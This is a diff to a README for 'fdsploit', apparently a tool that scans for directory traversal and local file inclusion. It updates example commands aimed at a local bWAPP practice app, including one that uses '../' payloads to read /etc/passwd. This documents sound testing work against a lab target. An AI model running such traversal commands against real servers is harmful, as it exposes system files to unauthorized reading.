@@ -33,7 +33,7 @@ So far, there are only two lfi-shell built-in commands:
 From the below output it seems that the `directory` parameter is probably vulnerable to directory traversal vulnerability since every request with `../` as payload produces a different _sha-256_ hash. Also the content-length is different for every request:
 
 ```python
-./fdsploit.py -u 'http://127.0.0.1:8888/test/bWAPP/bWAPP/rlfi.php?language=fsd&action=go' -c 'PHPSESSID=a55475b0abccbf3b32fab4c95a98c3ab; security_level=0' -d 7
+./fdsploit.py -u 'http://127.0.0.1:8888/test/bWAPP/bWAPP/directory_traversal_2.php?directory=documents' -c 'PHPSESSID=7acf1c5311fee614d0eb40d7f3473087; security_level=0' -d 8
 ```
 <img src="images/directory_traversal.png" width="70%">
 
@@ -42,7 +42,7 @@ From the below output it seems that the `directory` parameter is probably vulner
 Again, the language parameter seems vulnerable to **LFI** since using `../etc/passwd` _etc.._ as payload, every request being colored with green produces a different hash, a different content-length from the initial, and the keyword specified is found in the response:
 
 ```python
-./fdsploit.py -u 'http://127.0.0.1:8888/test/bWAPP/bWAPP/rlfi.php?language=fsd&action=go' -c 'PHPSESSID=a55475b0abccbf3b32fab4c95a98c3ab; security_level=0' -d 7 -k root -p /etc/passwd
+./fdsploit.py -u 'http://127.0.0.1:8888/test/bWAPP/bWAPP/rlfi.php?language=*&action=go' -c 'PHPSESSID=7acf1c5311fee614d0eb40d7f3473087; security_level=0' -d 7 -k root -p /etc/passwd
 ```
 <img src="images/lfi.png" width="70%">
 
